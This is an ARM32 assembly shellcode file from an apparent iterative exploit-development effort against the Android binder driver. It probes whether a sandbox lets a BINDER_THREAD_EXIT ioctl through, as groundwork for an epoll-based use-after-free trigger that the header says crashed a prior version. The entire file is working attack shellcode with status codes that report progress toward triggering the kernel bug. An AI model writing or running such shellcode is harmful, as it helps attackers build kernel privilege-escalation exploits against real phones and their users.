/*
 * uaf_trigger_test_b.s — Isolate: is BINDER_THREAD_EXIT SECCOMP-allowed?
 * ARM32 EABI shellcode
 *
 * v17 crashed. Two possible causes:
 *   A) SECCOMP kills process on BINDER_THREAD_EXIT ioctl (cmd 0x40046208)
 *   B) close(epoll_fd) UAF crashes kernel (list_del on freed memory)
 *
 * This test does ONLY BINDER_THREAD_EXIT (no epoll at all):
 *   1. openat("/dev/binder")     — confirmed v15
 *   2. BINDER_SET_MAX_THREADS    — confirmed v15
 *   3. BINDER_THREAD_EXIT        — THE TEST
 *   4. nanosleep(50ms)           — settle
 *   5. close(binder_fd)          — cleanup
 *   6. Return 0xBB00 if survived
 *
 * If this ALSO crashes → SECCOMP blocks BINDER_THREAD_EXIT
 * If this returns 0xBB00 → BINDER_THREAD_EXIT is allowed,
 *   the v17 crash was from the epoll UAF trigger
 *
 * Return value:
 *   0xBB00 = BINDER_THREAD_EXIT survived!
 *   0xA1EE = openat failed
 *   0xA2EE = BINDER_SET_MAX_THREADS failed
 *   Crash  = SECCOMP RET_KILL on BINDER_THREAD_EXIT
 */

    .syntax unified
    .arch armv7-a
    .text
    .align 2
    .globl _start
    .type _start, %function

.equ O_RDWR, 2

_start:
    push    {r4-r11, lr}
    sub     sp, sp, #32

    /* ── A1: openat(AT_FDCWD, "/dev/binder", O_RDWR) ── */
    mvn     r0, #99             /* AT_FDCWD = -100 */
    adr     r1, str_binder
    mov     r2, #O_RDWR
    mov     r3, #0
    mov     r7, #320
    add     r7, r7, #2          /* 322 = __NR_openat */
    svc     #0
    cmp     r0, #0
    bmi     fail_a1
    mov     r4, r0              /* R4 = binder_fd */

    /* ── A2: ioctl(binder_fd, BINDER_SET_MAX_THREADS, &0) ── */
    mov     r0, r4
    ldr     r1, const_smt
    mov     r3, #0
    str     r3, [sp, #0]
    add     r2, sp, #0
    mov     r7, #54             /* __NR_ioctl */
    svc     #0
    cmp     r0, #0
    bmi     fail_a2

    /* ── B1: BINDER_THREAD_EXIT — THE CRITICAL TEST ── */
    /* If SECCOMP blocks this, process dies here */
    mov     r0, r4              /* binder_fd */
    ldr     r1, const_bte       /* BINDER_THREAD_EXIT = 0x40046208 */
    mov     r2, #0
    mov     r7, #54             /* __NR_ioctl */
    svc     #0
    /* R0 = return value (don't care — thread is freed regardless) */

    /* ── B2: nanosleep(50ms) — let kernel settle ── */
    mov     r3, #0
    str     r3, [sp, #8]        /* tv_sec = 0 */
    ldr     r3, const_50ms
    str     r3, [sp, #12]       /* tv_nsec = 50000000 */
    add     r0, sp, #8
    mov     r1, #0
    mov     r7, #162            /* __NR_nanosleep */
    svc     #0

    /* ── B3: close(binder_fd) ── */
    mov     r0, r4
    mov     r7, #6              /* __NR_close */
    svc     #0

    /* ═══ SURVIVED! BINDER_THREAD_EXIT is SECCOMP-allowed ═══ */
    mov     r0, #0xBB00
    b       done

fail_a1:
    rsb     r0, r0, #0
    mov     r1, #0xA100
    orr     r0, r0, r1
    b       done
fail_a2:
    rsb     r0, r0, #0
    mov     r1, #0xA200
    orr     r0, r0, r1
    b       done

done:
    add     sp, sp, #32
    pop     {r4-r11, pc}

    /* ── Data pool ── */
    .align 2
const_smt:
    .word   0x40046205          /* BINDER_SET_MAX_THREADS */
const_bte:
    .word   0x40046208          /* BINDER_THREAD_EXIT */
const_50ms:
    .word   50000000            /* 50ms in nanoseconds */
str_binder:
    .asciz  "/dev/binder"
    .align  2
